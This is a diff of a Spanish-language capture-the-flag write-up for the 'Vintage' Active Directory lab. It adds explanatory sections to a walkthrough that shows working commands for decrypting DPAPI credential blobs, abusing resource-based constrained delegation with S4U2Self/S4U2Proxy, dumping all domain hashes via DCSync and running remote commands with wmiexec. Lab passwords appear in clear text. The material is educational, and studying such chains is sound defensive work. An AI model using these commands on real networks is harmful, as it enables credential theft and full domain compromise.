-[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\C.Neri\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D"))
 ```
-
-Guardamos cada output en nuestra máquina:
 
 ```bash
-echo "<BASE64>" | base64 -d > masterkey1
-echo "<BASE64>" | base64 -d > masterkey2
-echo "<BASE64>" | base64 -d > blob_roaming
-echo "<BASE64>" | base64 -d > blob_local
+echo "<BASE64_MASTERKEY>" | base64 -d > masterkey2
+echo "<BASE64_BLOB>"      | base64 -d > blob_roaming
 ```
 
-Desciframos la masterkey con la contraseña del usuario:
+### Descifrado de la Masterkey
+
+Usamos la contraseña conocida de `C.Neri` (`Zer0the0ne`) junto con su SID para descifrar la Masterkey:
 
 ```bash
 dpapi.py masterkey -file masterkey2 -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password 'Zer0the0ne'
@@ -446,7 +448,9 @@ Decrypted key with User Key (MD4 protected)
 Decrypted key: 0x55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a65...
 ```
 
-Desciframos el blob de credencial con la masterkey obtenida:
+### Descifrado del blob de credenciales
+
+Con la Masterkey en claro, desciframos el blob que contiene la credencial almacenada:
 
 ```bash
 dpapi.py credential -file blob_roaming -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b...
@@ -460,34 +464,83 @@ Username    : vintage\c.neri_adm
 Password    : Uncr4ck4bl3P4ssW0rd0312
 ```
 
+> `C.Neri` tenía almacenada en su perfil la contraseña de su cuenta administrativa `C.Neri_adm`. DPAPI la protegía, pero nosotros ya teníamos la contraseña del usuario para descifrarla.
+
 ---
 
-## RBCD (Resource-Based Constrained Delegation)
+## RBCD + S4U2Proxy + DCSync
 
-Con las credenciales de `C.Neri_adm`, BloodHound revela que el grupo **DELEGATEDADMINS**
-tiene `AllowedToAct` sobre `DC01`, y `C.Neri_adm` puede añadir miembros a ese grupo.
+### ¿Qué es Resource-Based Constrained Delegation (RBCD)?
+
+La **delegación de Kerberos** permite que un servicio actúe **en nombre de un usuario** para acceder a otros servicios. Esto es necesario en arquitecturas de múltiples capas (ej: un servidor web que consulta una base de datos con la identidad del usuario que hizo la petición HTTP).
+
+Existen tres tipos de delegación en AD:
+
+| Tipo | Configuración | Control |
+|------|--------------|---------|
+| Unconstrained | En el objeto delegador | Administrador del dominio |
+| Constrained (KCD) | En el objeto delegador | Administrador del dominio |
+| Resource-Based (RBCD) | En el objeto **destino** | Propietario del recurso destino |
+
+**RBCD es diferente porque el control está en el destino, no en el origen.** El atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` del objeto destino define qué cuentas pueden delegar hacia él. Si podemos escribir ese atributo en un objeto, controlamos quién puede impersonar usuarios hacia ese objeto.
+
+### ¿Cómo funciona el ataque?
+
+Para explotar RBCD necesitamos:
+
+1. **Una cuenta con SPN** (puede ser cualquier machine account o cuenta de servicio).
+2. **Permiso de escritura** sobre el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` del objeto destino (en este caso, `DC01`).
+
+El flujo del ataque usa dos extensiones de Kerberos:
+
+```
+Atacante (FS01$)
+    │
+    │ 1. S4U2Self: solicita un TGS para sí mismo EN NOMBRE de L.Bianchi_adm
+    │    (el KDC lo permite porque FS01$ está en msDS-AllowedToActOnBehalf del DC)
+    ▼
+   KDC
+    │
+    │ 2. TGS para L.Bianchi_adm → FS01$ (marcado como forwardable)
+    ▼
+Atacante (FS01$)
+    │
+    │ 3. S4U2Proxy: usa ese TGS para solicitar acceso al servicio LDAP del DC
+    │    en nombre de L.Bianchi_adm
+    ▼
+   KDC
+    │
+    │ 4. TGS para ldap/dc01.vintage.htb en nombre de L.Bianchi_adm
+    ▼
+Atacante
+    │
+    │ 5. Usa el TGS para conectarse como L.Bianchi_adm → DCSync
+    ▼
+   DC01
+```
+
+### ¿Por qué S4U2Self + `-force-forwardable`?
+
+Normalmente, `S4U2Self` solo produce tickets forwardable si la cuenta solicitante tiene **Trusted to Authenticate for Delegation** configurado. Con `-force-forwardable` de Impacket forzamos que el ticket sea marcado como forwardable independientemente, lo que permite usarlo en el paso S4U2Proxy.
+
+### ¿Por qué usamos FS01$ y no otra cuenta?
+
+Porque el ataque requiere una cuenta con **SPN existente**. Las machine accounts tienen SPNs registrados automáticamente (HOST, TERMSRV, etc.), y `FS01$` tiene una contraseña conocida. No necesitamos crear una cuenta nueva.
+
+BloodHound confirma que `DELEGATEDADMINS` tiene `AllowedToAct` sobre `DC01$`, y `C.Neri_adm` puede añadir miembros a ese grupo:
 
 ![RBCD](/assets/img/vintage/rbcd.png)
-
-Para el ataque necesitamos una cuenta con **SPN**. Usamos `FS01$` ya que al ser una machine
-account tiene SPNs automáticamente y su contraseña es conocida (Pre-Windows 2000: nombre
-en minúsculas sin `$`).
 
 ### 1. Obtener TGT de C.Neri_adm
 
 ```bash
 getTGT.py vintage.htb/C.Neri_adm:'Uncr4ck4bl3P4ssW0rd0312' -dc-ip $IP
-```
-
-```
-[*] Saving ticket in C.Neri_adm.ccache
-```
-
-```bash
 export KRB5CCNAME=$(pwd)/C.Neri_adm.ccache
 ```
 
-### 2. Agregar FS01$ al grupo DELEGATEDADMINS
+### 2. Añadir FS01$ al grupo DELEGATEDADMINS
+
+Con esto, `FS01$` queda autorizada en el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` de `DC01$`:
 
 ```bash
 bloodyAD --host dc01.vintage.htb --dc-ip $IP -d vintage.htb -u 'C.Neri_adm' -k add groupMember DELEGATEDADMINS 'fs01$'
@@ -501,17 +554,10 @@ bloodyAD --host dc01.vintage.htb --dc-ip $IP -d vintage.htb -u 'C.Neri_adm' -k a
 
 ```bash
 getTGT.py vintage.htb/'fs01$':'fs01' -dc-ip $IP
-```
-
-```
-[*] Saving ticket in fs01$.ccache
-```
-
-```bash
 export KRB5CCNAME=$(pwd)/fs01\$.ccache
 ```
 
-### 4. S4U2Proxy — Impersonar L.Bianchi_adm
+### 4. S4U2Self + S4U2Proxy — Impersonar L.Bianchi_adm
 
 ```bash
 getST.py vintage.htb/'fs01$':'fs01' -spn ldap/dc01.vintage.htb -impersonate L.Bianchi_adm -force-forwardable -dc-ip $IP
@@ -527,6 +573,12 @@ getST.py vintage.htb/'fs01$':'fs01' -spn ldap/dc01.vintage.htb -impersonate L.Bi
 
 ### 5. DCSync — Volcar todos los hashes del dominio
 
+**DCSync** abusa del protocolo de replicación de Active Directory (**MS-DRSR**). Los Controladores de Dominio se replican entre sí constantemente para mantener consistencia. El proceso incluye sincronizar los hashes de contraseñas de todos los objetos.
+
+Si una cuenta tiene los permisos `DS-Replication-Get-Changes` y `DS-Replication-Get-Changes-All` sobre el objeto de dominio, puede **solicitar al DC que le envíe los datos de replicación**, incluyendo los hashes NTLM de todos los usuarios. Esto es lo que hacen los DCs legítimamente entre sí, y es exactamente lo que simulamos con `secretsdump.py`.
+
+`L.Bianchi_adm` tiene estos permisos por ser miembro de un grupo privilegiado del dominio:
+
 ```bash
 export KRB5CCNAME=$(pwd)/L.Bianchi_adm.ccache
 
@@ -539,8 +591,11 @@ secretsdump.py -k -no-pass vintage.htb/L.Bianchi_adm@dc01.vintage.htb
 
 ## Acceso Final como Administrador
 
+Con el hash del Administrador realizamos Pass-the-Hash a través de WMI:
+
 ```bash
-wmiexec.py -k -no-pass vintage.htb/L.Bianchi_adm@dc01.vintage.htb "type C:\Users\Administrator\Desktop\root.txt"
+wmiexec.py -k -no-pass vintage.htb/L.Bianchi_adm@dc01.vintage.htb \
+  "type C:\Users\Administrator\Desktop\root.txt"
 ```
 
 ```
